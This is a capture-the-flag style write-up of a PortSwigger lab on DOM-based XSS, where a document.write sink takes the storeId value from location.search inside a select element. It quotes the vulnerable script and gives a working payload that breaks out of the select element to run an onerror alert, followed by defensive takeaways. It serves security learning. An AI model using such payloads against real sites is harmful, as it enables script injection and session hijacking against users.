# Challenge Name: DOM XSS in `document.write` sink using source `location.search` inside a select element 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
DOM Cross-site scripting (XSS)

## 2. Root Cause
Web application uses dangerous methods such as `document.write` and `window.location.search` without proper validation, which makes them act like a sink and source for DOM XSS respectively. 

## 3. Attack Surface
`/product?productId=x&storeId=`

## 4. Exploit Method
Web application uses the following script code:
```js
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```
In this script code, dangerous method `window.location.search` takes user input without validation and sanitization, and later on uses it in another dangerous method `document.write` again without checking. Therefore, `document.write` becomes a sink for this DOM XSS.
## 5. Payload / Technique
The payload used in this exploit is:
```html
/product?productId=3&storeId=Paris</option></select><img src=/ onerror=alert(1)>
```
In this payload, we are closing the `select` element and afterwards inject with malicious script to run DOM XSS. 

## 6. Impact
Attacker can run arbitrary javascript in victim's browser that can lead to session hijacking, account takeover, and phishing.

## 7. Reusable Pattern
Check whether website uses dangerous methods `document.write` and `window.location.search` without validation and sanitizing

## 8. Key Takeaway
Do not use dangerous methods that can lead to DOM XSS. Always validate user input before parsing it. Do not create or parse anything into html from user.


